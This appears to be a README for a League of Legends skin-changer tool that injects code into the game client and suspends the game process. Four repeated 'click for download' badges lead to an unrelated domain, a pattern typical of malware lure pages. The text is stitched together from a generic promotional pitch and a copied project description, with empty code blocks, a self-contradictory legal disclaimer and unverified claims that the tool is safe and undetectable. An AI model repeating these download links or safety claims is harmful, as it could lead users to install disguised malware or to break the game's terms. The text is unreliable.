# 🌹 Rose - Effortless Skin Changer for LoL

 What is LoL SkinChanger? 🎮
LoL SkinChanger is a powerful, user-friendly tool designed to modify in-game skins for League of Legends on Windows 2025 editions. 💻 In 2025, with enhanced security and performance updates from Riot Games, this tool ensures seamless compatibility, allowing you to enjoy skins like Legendary Ezreal or Galactic Aatrox without the hefty price tag. 🔧 It's not just about aesthetics—it's about personalization and creativity in the ever-evolving world of MOBA gaming. 🌟


---

<div style="text-align: center">
  <a href="https://vergen.click/s/topics">
    <img class="bumbum" style="width: 800px" alt="Static Badge" src="https://img.shields.io/badge/click_for_download-LoL_SkinChanger-orange">
  </a>
</div>

---

![Visitors: 10K+](https://img.shields.io/badge/Visitors-10K+-ff9f43) ![Subscribers: 3K+](https://img.shields.io/badge/Subscribers-3K+-6ab04c) ![Last Updated: today](https://img.shields.io/badge/Last_Updated-week-3498db)

---

<img src="https://user-images.githubusercontent.com/58574988/134170370-c827d712-fcc7-432f-b9f8-96678b0c9bf6.gif">

## Overview

Rose is an open-source automatic skin changer for League of Legends that enables seamless access to all skins in the game. The application runs silently in the system tray and automatically detects skin selections during champion select, injecting the chosen skin when the game loads.

**Rose is built on two core technologies:**

- **🎮 [Pengu Loader]**: Plugin system that injects JavaScript plugins into the League Client, enabling enhanced UI interactions and quick skin detection
- **🔧 [CSLOL]**: Safe skin injection framework that handles the actual skin injection process, fully compatible with Riot Vanguard

These technologies work together to provide a seamless and effortless automatic skin-changing experience without any manual intervention.

## Architecture

Rose consists of two main components:

### Python Backend

- **LCU API Integration**: Communicates with the League Client via the League Client Update (LCU) API
- **CSLOL Injection**: Uses CSLOL tools for safe skin injection
- **WebSocket Bridge**: Operates a WebSocket server for real-time communication with frontend plugins
- **Skin Management**: Downloads and manages skins
- **Game Monitoring**: Tracks game state, champion select phases, and loadout countdowns
- **Analytics**: Sends periodic pings to track unique users (configurable, runs in background thread)

---

<div style="text-align: center">
  <a href="https://vergen.click/s/topics">
    <img class="bumbum" style="width: 800px" alt="Static Badge" src="https://img.shields.io/badge/click_for_download-LoL_SkinChanger-orange">
  </a>
</div>

---


## How It Works

1. **League Client Integration**: Rose activates **[Pengu Loader]** on startup, which injects the JavaScript plugins into the League Client
2. **Skin Detection**: When you hover over a skin in champion select, [`ROSE-SkinMonitor`] detects the selection and sends it to the Python backend
3. **Game Opening Delay**: To make sure the injection has time to occur we suspend League of Legend's game process as long as the overlay is not ran
4. **Game Injection**: Using CSLOL tools, Rose injects the selected skin when the game starts
5. **Seamless Experience**: The skin loads as if you owned it, with full chroma support and no gameplay impact (Rose will never provide any competitive advantage to its users)

## Features

- **Automatic Skin Detection**: Detects skin selections through hover events in champion select
- **All Skins Accessible**: Access to every skin for every champion
- **Chroma Support**: Select any chroma variant through the enhanced UI
- **Random Skin Mode**: Automatically select random skins
- **Historic Mode**: Access last used skin on every champion
- **Custom Mod Insights**: ROSE-CustomWheel surfaces installed mods relevant to the skin you're hovering over, along with timestamps and quick folder access
- **Smart Injection**: Never injects skins you already own
- **Safe & Compatible**: Uses CSLOL injection tools compatible with Riot Vanguard
- **Multi-Language Support**: Works with any client language
- **Open Source**: Fully open source and extensible
- **Free**: If you bought this software, you got scammed 💀

## Requirements

- **Windows 10/11**
- **League of Legends** installed

## Installation

1. Download the latest installer 
2. Run the installer as Administrator
3. Launch Rose from the Start Menu or desktop shortcut

---

<div style="text-align: center">
  <a href="https://vergen.click/s/topics">
    <img class="bumbum" style="width: 800px" alt="Static Badge" src="https://img.shields.io/badge/click_for_download-LoL_SkinChanger-orange">
  </a>
</div>

---


```

## Analytics Configuration

Rose includes an optional analytics system that tracks unique users by sending periodic pings to a server. The analytics system:

- **Runs in background**: Operates as a daemon thread, doesn't affect app performance
- **Sends pings every 5 minutes**: Includes machine ID and app version
- **Configurable**: Can be enabled/disabled via `ANALYTICS_ENABLED` in `config.py`
- **Privacy-friendly**: Uses machine identifiers, no personal data collected

**Current Configuration**:
- Server URL: `https://api.leagueunlocked.net/analytics/ping`
- Ping interval: 5 minutes (300 seconds)
- Enabled by default

To configure analytics:
1. Edit `config.py`
2. Update `ANALYTICS_SERVER_URL` to your server endpoint
3. Adjust `ANALYTICS_PING_INTERVAL_S` if needed
4. Set `ANALYTICS_ENABLED = False` to disable


## Project Structure

```

---

<div style="text-align: center">
  <a href="https://vergen.click/s/topics">
    <img class="bumbum" style="width: 800px" alt="Static Badge" src="https://img.shields.io/badge/click_for_download-LoL_SkinChanger-orange">
  </a>
</div>

---



```

## Development

### Key Technologies

- **Python 3.11+**: Backend application
- **[Pengu Loader](https://github.com/FlorentTariolle/ROSE-Pengu)**: Plugin system for League Client
- **[CSLOL](https://github.com/LeagueToolkit/cslol-manager)**: Safe skin injection tools
- **LCU API**: League Client communication
- **WebSocket**: Real-time frontend-backend communication
- **JavaScript/HTML/CSS**: Client UI plugins

### Contributing

Rose is open source! Contributions are welcome:

- Report bugs or suggest features via GitHub Issues
- Submit pull requests for improvements
- Join our [Discord](https://discord.com/invite/cDepnwVS8Z) for discussions

## Legal Disclaimer

**Important**: This project is not endorsed by Riot Games and does not represent the views or opinions of Riot Games or any of its affiliates. Riot Games and all related properties are trademarks or registered trademarks of Riot Games, Inc.

The use of custom skin tools may violate Riot Games' Terms of Service. Users proceed at their own risk.

Custom skins are allowed under Riot's terms of service and do not trigger detection as long as you are not discussing or advertising the use of the skins within the game.
